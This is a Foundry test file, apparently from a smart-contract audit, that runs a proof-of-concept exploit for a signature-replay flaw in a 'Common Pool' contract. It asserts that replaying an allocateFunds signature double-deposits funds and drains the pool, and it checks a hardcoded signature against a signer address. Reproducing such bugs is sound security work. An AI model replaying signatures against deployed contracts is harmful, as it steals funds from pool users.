// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./52006-signature-does-not-take-all-parameters-into-account-and-can.sol";

/*//////////////////////////////////////////////////////////////
    Common Pool — incomplete signature scope allows allocateFunds replay (#52006)
//////////////////////////////////////////////////////////////*/
contract SignatureReplayTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.token().balanceOf(address(e)), 2 * e.AMOUNT(), "double deposit to market");
        assertEq(e.token().balanceOf(address(e.pool())), 0, "pool drained");
        assertEq(e.pool().orderNonce(), 2, "nonce = 2 after replay");
    }

    function test_sigRecoversApprovedSigner() public view {
        // Sanity: baked signature recovers the expected signer for AMOUNT.
        // (Uses a throwaway pool only for constructHash.)
        MockToken t = MockToken(address(0)); // unused — pure path via library-like
        t; // silence
        // Direct hash check matching Exploit constants.
        bytes32 input = keccak256(abi.encode(keccak256(bytes("Deposit(bytes32 multicall)")), uint256(1000e8)));
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", input));
        bytes32 r = 0x03c668c1af834a3b3b24e5136014d47b7d0042fdbcf4cc8f1324ecfdedc95d7a;
        bytes32 s = 0x5d8cc4902cac807161164888ac0d2ee8fde315230fbc48f7291e11e30a23d934;
        address recovered = ecrecover(ethSigned, 27, r, s);
        assertEq(recovered, 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7, "sig must recover SIGNER");
    }
}
